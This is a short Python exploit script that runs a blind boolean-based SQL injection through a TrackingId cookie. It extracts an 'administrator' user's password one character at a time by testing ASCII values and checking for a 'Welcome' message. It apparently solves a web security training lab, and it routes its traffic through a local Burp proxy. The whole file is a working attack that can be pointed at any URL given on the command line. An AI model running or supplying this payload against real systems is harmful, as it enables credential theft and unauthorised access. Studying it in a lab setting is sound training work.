import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}  # Send to a proxy like burpsuite to check the response of the server 

def sqli_password(url):
    password_extracted = ""
    for i in range(1,21):  # Chars size of the password in a range of 1-21 which means password has 20 characters
        for j in range(32,126):  # ascii table numbers corresponding to a range of characters numbers and symbols // see ascii table as reference
            sqli_payload = "' and (select ascii(substring(password,%s,1)) from users where username='administrator')='%s'--" % (i,j) # sqli payload
            sqli_payload_encoded = urllib.parse.quote(sqli_payload) # URL Encode the payload
            cookies = {'TrackingId': 'dCqiyv8E4BfhhpHL' + sqli_payload_encoded, 'session': 'bdb4dZfXEcfucciq98jCIYBJW4NL7y7M'} # set the cookies available
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies) # verify=fase to not verify certificates
            if "Welcome" not in r.text:  # This "welcome" word is the output of a true statement from the server, meaning that when the sqli finds a true matching password character it will retrieve a "welcome" message 
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()
            else:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break  # to break from this second loop and start to guess the second char of the password

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])

    url = sys.argv[1]
    print("(+) Retrieving administrator password...")
    sqli_password(url)

if __name__ == "__main__":
    main()
